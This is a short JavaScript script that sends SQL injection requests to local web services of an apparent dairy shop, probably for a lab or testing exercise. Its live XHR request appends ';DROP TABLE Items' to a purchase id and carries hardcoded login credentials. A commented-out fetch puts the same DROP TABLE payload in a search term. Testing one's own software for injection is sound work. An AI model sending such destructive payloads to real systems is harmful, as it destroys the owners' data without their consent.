console.log("run");
/*fetch(`http://localhost:8188/DairyService.svc/search?term=DROP TABLE Items`, {
  method: "GET",
  headers: {
    "Content-Type": "application/json",
  },
}).then(console.log("done"));*/
//using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM Items WHERE Id = @id"))
list = [1];
breakB = false;
console.log("here");
list.forEach((element) => {
  var xhr = new XMLHttpRequest();
  xhr.open(
    "GET",
    `http://localhost:8189/Service.svc/buy?id=248309252;%20DROP%20TABLE%20Items`,
    true,
    "jbon007",
    "jbon007passwd"
  );
  xhr.withCredentials = true;
  xhr.addEventListener("readystatechange", function () {
    if (this.readyState === 4) {
      console.log(this.responseText);
      /*if (this.responseText.includes("Fault ")) {
      } else {
        if (
          this.responseText.includes(
            "Thank you for purchasing Fromage frais fruit"
          )
        ) {
          document.getElementById("works").innerHTML += `<br>${element}<br>`;
          console.log(this.responseText);
          breakB = true;
        }
      }
    }*/
    }
  });
  xhr.send();
  //console.log(xhr.status);
});
//*/
